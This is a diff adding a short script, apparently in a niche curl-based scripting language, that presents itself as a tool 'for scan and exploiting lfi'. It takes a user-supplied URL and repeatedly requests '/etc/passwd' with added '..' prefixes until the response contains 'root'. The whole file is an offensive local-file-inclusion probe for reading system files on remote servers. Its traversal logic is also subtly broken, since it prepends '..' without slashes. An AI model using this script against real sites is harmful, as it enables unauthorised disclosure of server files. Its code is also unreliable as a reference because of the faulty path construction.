@@ -1,0 +1,25 @@
+/**
+* Title: LFI Scanner
+* Description: This tools for scan and exploiting lfi
+*/
+
+load "http/curl"
+
+print "LFI Scanner\n"
+
+print "URL Target: "
+input.start()
+	@target = input.value
+	@exploit = "/etc/passwd"
+    for(@loop = 1| @loop <= 10| @loop++)
+        @result = curl.get(@target,@exploit)
+        @result = preg_match("/root/i", @result)
+        if(@result)
+            print "[*] Local file inclusion found >> ".@target.@exploit."\n"
+            return;
+        else
+            print "[*] Trying bypass local file inclusion\n"
+            @exploit = '..'.@exploit
+        end
+    end
+input.close()
